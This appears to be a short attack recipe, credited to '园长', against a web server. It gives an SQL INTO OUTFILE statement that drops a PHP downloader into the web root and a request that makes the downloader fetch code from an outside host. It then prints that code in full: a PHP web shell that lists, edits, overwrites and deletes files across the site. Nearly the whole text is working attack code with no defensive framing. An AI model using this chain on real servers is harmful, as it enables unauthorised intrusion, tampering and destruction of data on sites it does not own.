author:园长

sql:
select '<?php file_put_contents(dirname(__FILE__)."/".$_GET[\'file\'], file_get_contents($_GET[\'url\']));?>' into outfile'/var/www/html/xxx/data/conf_ads.php'


GET:
http://www.XXX.com.cn/data/conf_ads.php?file=admin3.php&url=http://p2j.cn/1.txt


1.txt:
<?php
echo "<form action=\"\" method=\"post\" id=\"fm\">";
function getFile($path,$charset) {
     header("Content-Type:text/html;charset=".$charset);
     if (is_dir($path)) {
          $dir = opendir ( $path );
          while ( $file = readdir ( $dir ) ) {
               echo "<a href=\"javascript:get('".str_replace('\\','/',$path)."/".$file."');\">".$file."</a><br>";
          }
          closedir($dir);
     } else {
          echo "File:<input type=\"text\" style=\"width:350px;\" name=\"file\" value=\"".$path."\" />
          <input type=\"button\" style=\"margin-left:20px;\" value=\"update\" onclick=\"update('update')\" />
          <input type=\"button\" style=\"margin-left:20px;\" value=\"delete\" onclick=\"update('delete')\" />
          <span id=\"result\"></span><br/>";
          echo "<textarea style=\"width:600px;height:500px;\" name=\"data\">".htmlspecialchars(file_get_contents($path))."</textarea>";
     }
     echo "<input type=\"hidden\" name=\"p\" id=\"p\" value=\"".$path."\"/><input type=\"hidden\" name=\"action\" id=\"action\" value=\"get\" /></form>";
}
function update($filename,$data){
     file_put_contents($filename, $data);
     echo "<script>history.back(-1);alert('ok');</script>";
}
if('update'==$_POST['action']){
     update($_POST['file'],$_POST['data']);
}else if('delete'==$_POST['action']){
     if(file_exists($_POST['file'])){
          unlink($_POST['file']);
          echo "<script>history.back(-1);alert('delete ok');</script>";
     }
}else{
     getFile($_POST['p']!=''?$_POST['p']:$_SERVER['DOCUMENT_ROOT'],$_POST['charset']!=''?$_POST['charset']:"UTF-8");
}
?>
<script>
function get(p){
     document.getElementById('p').value = p;
     document.getElementById('action').value = "get";
     document.getElementById('fm').submit();
}
function update(act){
     document.getElementById('action').value = act;
     document.getElementById('fm').submit();
}
</script>